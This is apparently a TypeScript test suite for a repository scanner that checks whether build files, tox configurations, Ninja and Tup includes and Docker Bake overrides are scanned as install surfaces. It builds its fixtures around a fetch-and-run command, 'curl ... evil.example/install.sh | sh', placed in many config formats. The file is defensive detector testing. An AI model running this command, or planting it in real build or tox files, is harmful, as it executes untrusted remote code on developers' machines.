import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a build definition of a recognized build system is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. A build
  // definition runs commands at build time, so it is install content.
  for (const path of [
    "Makefile.in",
    "GNUmakefile.in",
    "Makefile.inc",
    "configure.ac",
    "configure.in",
    "m4/ax_check.m4",
    "build.xml",
    "build.ninja",
    "Tupfile",
    "build.sbt",
    "project/plugins.sbt",
    "build.boot",
    "build",
    "BUILD.bazel",
    "WORKSPACE",
    "WORKSPACE.bazel",
    "tools/defs.bzl",
    "wscript_build",
    "docker-bake.hcl",
    "ci/bake.hcl",
  ]) {
    const inspection = inspected(path, `${PAYLOAD}\n`);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("tox configuration commands are reviewed as an install surface", () => {
  // PRD section 8, VET-01 and VET-07. tox executes these commands. tox.ini
  // and tox.toml are install files by name. A shared manifest stays a
  // manifest until it contains a tox table, and then its commands join the
  // install surface, including download collection.
  const dedicated = [
    {
      path: "tox.ini",
      safe: "[testenv]\ncommands = python -m pytest\n",
      unsafe: `[testenv]\ncommands = ${PAYLOAD}\n`,
    },
    {
      path: "tox.toml",
      safe: "[env.t]\ncommands = [['python', '-m', 'pytest']]\n",
      unsafe: `[env.t]\ncommands = [['sh', '-c', '${PAYLOAD}']]\n`,
    },
    {
      path: "pkg/tox.toml",
      safe: "[env_run_base]\ncommands = [['python', '-m', 'pytest']]\n",
      unsafe: `[env_run_base]\ncommands = [['sh', '-c', '${PAYLOAD}']]\n`,
    },
  ];
  for (const definition of dedicated) {
    const safe = inspected(definition.path, definition.safe);
    const unsafe = inspected(definition.path, definition.unsafe);
    expect({
      path: definition.path,
      surfaces: surfacesOf(definition.path),
    }).toEqual({
      path: definition.path,
      surfaces: ["installScripts", "source"],
    });
    expect({
      path: definition.path,
      coverage: unsafe.coverage.installScripts,
    }).toEqual({
      path: definition.path,
      coverage: { state: "complete", items: 1 },
    });
    expect(safe.findings).toEqual([]);
    expect(safe.downloads).toEqual([]);
    expect(unsafe.findings).toContainEqual(
      expect.objectContaining({
        path: definition.path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(unsafe.downloads).toContain("https://evil.example/install.sh");
    expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
  }

  const shared = [
    {
      path: "pyproject.toml",
      safe: "[tool.tox.env.t]\ncommands = [['python', '-m', 'pytest']]\n",
      unsafe: `[tool.tox.env.t]\ncommands = [['sh', '-c', '${PAYLOAD}']]\n`,
    },
    {
      path: "pyproject.toml",
      safe: '[tool.tox]\nlegacy_tox_ini = """\n[testenv]\ncommands = python -m pytest\n"""\n',
      unsafe: `[tool.tox]\nlegacy_tox_ini = """\n[testenv]\ncommands = ${PAYLOAD}\n"""\n`,
    },
    {
      path: "pyproject.toml",
      safe: '[ tool . "tox" . env_run_base ]\ncommands = [["python", "-m", "pytest"]]\n',
      unsafe: `[ tool . "tox" . env_run_base ]\ncommands = [["sh", "-c", "${PAYLOAD}"]]\n`,
    },
    {
      path: "setup.cfg",
      safe: "[tox:tox]\nenvlist = t\n\n[testenv:t]\ncommands = python -m pytest\n",
      unsafe: `[tox:tox]\nenvlist = t\n\n[testenv:t]\ncommands = ${PAYLOAD}\n`,
    },
    {
      path: "setup.cfg",
      safe: "[ tox:tox ]\nenvlist = t\n\n[testenv]\ncommands = python -m pytest\n",
      unsafe: `[ tox:tox ]\nenvlist = t\n\n[testenv]\ncommands = ${PAYLOAD}\n`,
    },
    {
      path: "pyproject.toml",
      safe: '[project]\nname = "demo"\n\n[tool]\ntox.env.t.commands = [["python", "-m", "pytest"]]\n',
      unsafe: `[project]\nname = "demo"\n\n[tool]\ntox.env.t.commands = [["sh", "-c", "${PAYLOAD}"]]\n`,
    },
    {
      path: "pyproject.toml",
      safe: '[tool]\ntox = { env_run_base = { commands = [["python", "-m", "pytest"]] } }\n',
      unsafe: `[tool]\ntox = { env_run_base = { commands = [["sh", "-c", "${PAYLOAD}"]] } }\n`,
    },
    {
      path: "pyproject.toml",
      safe: 'tool.tox.legacy_tox_ini = """\n[testenv]\ncommands = python -m pytest\n"""\n',
      unsafe: `tool.tox.legacy_tox_ini = """\n[testenv]\ncommands = ${PAYLOAD}\n"""\n`,
    },
    {
      path: "pyproject.toml",
      safe: 'tool = { tox = { commands = ["python", "-m", "pytest"] } }\n',
      unsafe: `tool = { tox = { commands = ["${PAYLOAD}"] } }\n`,
    },
    {
      path: "pyproject.toml",
      safe: '[tool]\n"t\\u006fx".commands = ["python", "-m", "pytest"]\n',
      unsafe: `[tool]\n"t\\u006fx".commands = ["${PAYLOAD}"]\n`,
    },
  ];
  for (const definition of shared) {
    const safe = inspected(definition.path, definition.safe);
    const unsafe = inspected(definition.path, definition.unsafe);
    expect(surfacesOf(definition.path)).toEqual(["manifests", "source"]);
    expect(safe.coverage.installScripts).toEqual({
      state: "complete",
      items: 1,
    });
    expect(safe.findings).toEqual([]);
    expect(safe.downloads).toEqual([]);
    expect(unsafe.coverage.installScripts).toEqual({
      state: "complete",
      items: 1,
    });
    expect(unsafe.coverage.manifests).toEqual({
      state: "complete",
      items: 1,
    });
    const classified = (
      JSON.parse(new TextDecoder().decode(unsafe.inventory)) as {
        classifications: { path: string; surfaces: string[] }[];
      }
    ).classifications;
    expect(classified).toEqual([
      {
        path: definition.path,
        surfaces: ["installScripts", "manifests", "source"],
      },
    ]);
    expect(unsafe.findings).toContainEqual(
      expect.objectContaining({
        path: definition.path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(unsafe.downloads).toContain("https://evil.example/install.sh");
    expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
  }
});

test("a shared manifest without a tox table is not an install surface", () => {
  for (const definition of [
    {
      path: "pyproject.toml",
      text: `[project]\nname = "demo"\ndescription = "${PAYLOAD}"\n`,
    },
    {
      path: "setup.cfg",
      text: `[metadata]\nname = demo\n\n[testenv:t]\ncommands = ${PAYLOAD}\n`,
    },
    {
      path: "pyproject.toml",
      text: `[tool.toxin]\ncommands = "${PAYLOAD}"\n# [tool.tox]\n`,
    },
    {
      path: "pyproject.toml",
      text: `[tool]\ntox = "${PAYLOAD}"\n`,
    },
    {
      path: "pyproject.toml",
      text: `[tool]\ntox = ["${PAYLOAD}"]\n`,
    },
    {
      path: "pyproject.toml",
      text: `[tool]\ntox = { }\ndescription = "${PAYLOAD}"\n`,
    },
    {
      path: "pyproject.toml",
      text: `[tool]\n# tox = { commands = "${PAYLOAD}" }\nname = "demo"\n`,
    },
    {
      path: "pyproject.toml",
      text: `[tool]\ntoxin = { commands = "${PAYLOAD}" }\n`,
    },
    {
      path: "pyproject.toml",
      text: `[tool.pytest.ini_options]\ntox = { commands = "${PAYLOAD}" }\n`,
    },
    {
      path: "pyproject.toml",
      text: `[project]\ndescription = """\n[tool.tox]\ncommands = ${PAYLOAD}\n"""\n`,
    },
    {
      path: "pyproject.toml",
      text: `[[tool.tox.env]]\ncommands = ["${PAYLOAD}"]\n`,
    },
    {
      path: "pyproject.toml",
      text: `[[tool.tox]]\ncommands = [["${PAYLOAD}"]]\n`,
    },
  ]) {
    const inspection = inspected(definition.path, definition.text);
    expect({
      path: definition.path,
      surfaces: surfacesOf(definition.path),
      installScripts: inspection.coverage.installScripts,
      downloads: inspection.downloads,
    }).toEqual({
      path: definition.path,
      surfaces: ["manifests", "source"],
      installScripts: { state: "complete", items: 0 },
      downloads: [],
    });
  }
});

test("included Ninja and Tup commands are reviewed and invalidate reuse", () => {
  for (const definition of [
    {
      entry: "build.ninja",
      entryText: "include rules.ninja\nbuild artifact: fetch\n",
      included: "rules.ninja",
      safe: "rule fetch\n  command = echo safe\n",
      unsafe: `rule fetch\n  command = ${PAYLOAD}\n`,
    },
    {
      entry: "Tupfile",
      entryText: "include_rules\n: |> !fetch |> artifact\n",
      included: "Tuprules.tup",
      safe: "!fetch = |> echo safe |>\n",
      unsafe: `!fetch = |> ${PAYLOAD} |>\n`,
    },
  ]) {
    const scan = (text: string) =>
      inspectRepository({
        files: [
          {
            path: definition.entry,
            bytes: new TextEncoder().encode(definition.entryText),
          },
          {
            path: definition.included,
            bytes: new TextEncoder().encode(text),
          },
        ],
      });
    const before = scan(definition.safe);
    const after = scan(definition.unsafe);
    expect(after.coverage.installScripts).toEqual({
      state: "complete",
      items: 2,
    });
    expect(after.findings).toContainEqual(
      expect.objectContaining({
        path: definition.included,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(after.downloads).toContain("https://evil.example/install.sh");
    expect(after.inventorySha256).not.toBe(before.inventorySha256);
  }
});

test("changing a build definition changes the reviewed inventory", () => {
  const before = inspected("build.sbt", 'name := "app"\n');
  const after = inspected(
    "build.sbt",
    'name := "app"\nscalaVersion := "3.4.0"\n',
  );
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});

test("Docker Bake's automatic HCL override is scanned and changes the reuse key", () => {
  const scan = (override: string) =>
    inspectRepository({
      files: [
        {
          path: "docker-bake.hcl",
          bytes: new TextEncoder().encode(
            'target "default" { context = "." }\n',
          ),
        },
        {
          path: "docker-bake.override.hcl",
          bytes: new TextEncoder().encode(override),
        },
      ],
    });
  const before = scan('target "default" { dockerfile = "Dockerfile" }\n');
  const after = scan(
    `target "default" {\n  dockerfile-inline = <<EOF\nFROM alpine\nRUN ${PAYLOAD}\nEOF\n}\n`,
  );
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "docker-bake.override.hcl",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("the executable surface stays bounded", () => {
  // Only build definitions are added: unrelated extensionless files keep no
  // surface, so the inventory does not become a blanket text scan.
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(surfacesOf("NOTICE")).toEqual([]);
  expect(inspected("NOTICE", PAYLOAD).findings).toEqual([]);
});
